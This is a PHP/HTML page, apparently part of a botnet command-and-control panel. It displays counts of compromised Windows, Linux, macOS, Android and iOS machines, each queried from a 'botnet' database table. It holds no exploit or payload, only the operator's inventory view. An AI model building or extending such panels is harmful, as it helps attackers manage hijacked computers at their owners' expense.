<style>
	.demo-card-wide.mdl-card {
		width: 100%;
		min-height: inherit;
		padding: 15px;
		min-width: 800px;
	}
	
	.demo-card-wide> .mdl-card__menu {
		color: #fff;
	}
	
	td {
		border: 1px solid;
	}
</style>

<div class="mdl-grid demo-content">
	<div class="demo-card-wide mdl-card mdl-shadow--2dp">
		<h3>Botnet information</h3>
		<h4>Machines</h4>
		<h5>Desktop</h5>
		<ul class="demo-list-item mdl-list">
			<li class="mdl-list__item">
				<i class="fab fa-windows"></i>
				<span class="mdl-list__item-primary-content">
		Windows systems: <?php 
		$stmt = $conn->prepare("SELECT count(*) as total FROM botnet WHERE system='WINDOWS'");
		$stmt->execute();
		$result = $stmt->get_result();
		while($row = $result->fetch_assoc()) {
			echo $row[total];
		}
		?>
		 </span>
			
			</li>
			<li class="mdl-list__item">
				<i class="fab fa-linux"></i>
				<span class="mdl-list__item-primary-content">
		Linux systems (*): <?php 
		$stmt = $conn->prepare("SELECT count(*) as total FROM botnet WHERE system='LINUX'");
		$stmt->execute();
		$result = $stmt->get_result();
		while($row = $result->fetch_assoc()) {
			echo $row[total];
		}
		?>
		 </span>
			
			</li>
			<li class="mdl-list__item">
				<i class="fab fa-apple"></i>
				<span class="mdl-list__item-primary-content">
		macOs systems (*): <?php 
		$stmt = $conn->prepare("SELECT count(*) as total FROM botnet WHERE system='MACOS'");
		$stmt->execute();
		$result = $stmt->get_result();
		while($row = $result->fetch_assoc()) {
			echo $row[total];
		}
		?>
		 </span>
			
			</li>
		</ul>
		<h5>Mobile</h5>
		<ul class="demo-list-item mdl-list">
			<li class="mdl-list__item">
				<i class="fab fa-android"></i>
				<span class="mdl-list__item-primary-content">
		Android systems (*): <?php 
		$stmt = $conn->prepare("SELECT count(*) as total FROM botnet WHERE system='ANDROID'");
		$stmt->execute();
		$result = $stmt->get_result();
		while($row = $result->fetch_assoc()) {
			echo $row[total];
		}
		?>
		 </span>
			
			</li>
			<li class="mdl-list__item">
				<i class="fas fa-mobile"></i>
				<span class="mdl-list__item-primary-content">
		iOS systems (*): <?php 
		$stmt = $conn->prepare("SELECT count(*) as total FROM botnet WHERE system='IOS'");
		$stmt->execute();
		$result = $stmt->get_result();
		while($row = $result->fetch_assoc()) {
			echo $row[total];
		}
		?>
		 </span>
			
			</li>
		</ul>
		Note:<br />
		(*) = Not implemented yet.
	</div>
</div>